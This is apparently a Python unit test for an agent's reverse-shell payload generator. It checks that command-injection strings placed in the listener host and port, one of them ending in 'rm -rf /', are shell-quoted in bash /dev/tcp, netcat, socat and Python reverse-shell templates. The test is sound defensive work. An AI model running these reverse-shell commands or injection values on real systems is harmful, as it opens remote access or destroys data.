import unittest
import shlex
from james.core.agent import Agent
from unittest.mock import Mock

class TestAgentReverseShellSecurity(unittest.TestCase):
    def setUp(self):
        # We only test the _do_reverse_shell method which doesn't need a full initialized orchestrator
        # But Agent expects an orchestrator, we can bypass the init if needed or just pass a mock
        self.agent = Agent(Mock())
        self.agent.context = {}

    def test_reverse_shell_payload_escaping(self):
        # Malicious input that tries to inject commands via lhost
        malicious_lhost = '10.0.0.1"; echo "HACKED" #'
        malicious_port = '4444; rm -rf /'

        self.agent.context["lhost"] = malicious_lhost

        class MockMatch:
            def group(self, idx):
                return malicious_port

        output = self.agent._do_reverse_shell(MockMatch(), "")

        # Verify the malicious parts are safely quoted
        # Bash payload
        safe_lhost = shlex.quote(malicious_lhost)
        safe_port = shlex.quote(malicious_port)

        # They should appear properly quoted in the bash payload
        self.assertIn(f"bash -i >& /dev/tcp/{safe_lhost}/{safe_port} 0>&1", output)

        # Verify Python payload
        self.assertIn("python3 -c", output)
        # Verify netcat payload
        self.assertIn(f"nc {safe_lhost} {safe_port}", output)
        # Verify socat payload
        self.assertIn(f"tcp:{safe_lhost}:{safe_port}", output)

        # Quick check that unescaped malicious payload is NOT directly inserted
        # (Though it might appear in the informational header, the actual commands should be safe)
        # Check that we don't have unquoted `; rm -rf /` in the command areas
        # A simple check: the Python string must be using repr and safely quoted
        self.assertNotIn("connect((\"10.0.0.1\"; echo \"HACKED\" #\",", output)

if __name__ == '__main__':
    unittest.main()
